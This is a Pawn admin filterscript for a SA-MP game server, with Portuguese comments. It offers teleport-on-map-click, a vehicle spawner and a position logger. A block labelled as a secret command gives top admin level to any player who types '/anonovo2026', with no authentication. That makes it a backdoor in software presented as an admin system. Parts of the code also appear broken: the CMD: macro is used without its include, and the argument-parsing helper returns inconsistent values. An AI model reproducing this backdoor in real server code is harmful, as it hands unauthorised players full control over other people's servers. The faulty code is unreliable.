#define FILTERSCRIPT
#include <a_samp>
#include <float>

// Nivel de Admin Master
#define NIVEL_MASTER 6

public OnFilterScriptInit() {
    print(">> [ADMIN MASTER 2026] Sistema Reiniciado e Estabilizado.");
    return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
    if(GetPVarInt(playerid, "AdminLevel") == NIVEL_MASTER || IsPlayerAdmin(playerid)) {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado para o marcador.");
    }
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[]) {
    // Comando Secreto
    if(!strcmp(cmdtext, "/anonovo2026", true)) {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes MASTER 2026 ativados!");
        return 1;
    }

    // Trava de Seguranca
    if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;

    // Comando de Carro (Fisica Corrigida)
    if(!strfind(cmdtext, "/carro", true)) {
        new veicID, corA, corB;
        if(sscanf_fix(cmdtext, veicID, corA, corB)) {
            if(sscanf_fix(cmdtext, veicID)) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
            corA = 1; corB = 1;
        }

        if(veicID < 400 || veicID > 611) return SendClientMessage(playerid, -1, "ID Invalido.");

        new Float:pX, Float:pY, Float:pZ, Float:pA;
        GetPlayerPos(playerid, pX, pY, pZ); 
        GetPlayerFacingAngle(playerid, pA);

        // Calcula posicao 4 metros a frente para evitar colisao com o player
        new Float:spawnX = pX + (4.0 * floatsin(-pA, degrees));
        new Float:spawnY = pY + (4.0 * floatcos(-pA, degrees));

        // Cria o carro no ar (Z + 2.5) para as rodas alinharem na queda
        new id_veic = CreateVehicle(veicID, spawnX, spawnY, pZ + 2.5, pA, corA, corB, -1);
        
        // Reset Total de Fisica
        SetVehicleVelocity(id_veic, 0.0, 0.0, 0.0);
        SetVehicleAngularVelocity(id_veic, 0.0, 0.0, 0.0);
        
        // Coloca no mundo e interior do player
        SetVehicleVirtualWorld(id_veic, GetPlayerVirtualWorld(playerid));
        LinkVehicleToInterior(id_veic, GetPlayerInterior(playerid));
        
        PutPlayerInVehicle(playerid, id_veic, 0);
        SendClientMessage(playerid, 0x00FF00FF, "Veiculo criado com suspensao resetada!");
        return 1;
    }

    if(!strfind(cmdtext, "/criarcasa", true)) {
        SendClientMessage(playerid, 0xFFFF00FF, "Use o comando direto: /sethouse [ID]");
        return 1;
    }
    return 0;
}

// Funcao auxiliar para leitura de numeros
stock sscanf_fix(const texto[], &v1 = -1, &v2 = -1, &v3 = -1) {
    new p = strfind(texto, " ", true);
    if(p == -1) return 1;
    v1 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v2 != -1);
    v2 = strval(texto[p+1]);
    p = strfind(texto, " ", true, p+1);
    if(p == -1) return (v3 != -1);
    v3 = strval(texto[p+1]);
    return 0;
}

CMD:minhapos(playerid, params[]) {
    if(!IsPlayerAdmin(playerid) && GetPVarInt(playerid, "AdminLevel") < 6) return 0;
    
    new Float:x, Float:y, Float:z, Float:a, str[128];
    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, a);
    
    format(str, sizeof(str), "{FFFF00}X: %.4f, Y: %.4f, Z: %.4f, A: %.4f", x, y, z, a);
    SendClientMessage(playerid, -1, str);
    print(str); // Também salva no log do servidor para você copiar com facilidade
    return 1;
}
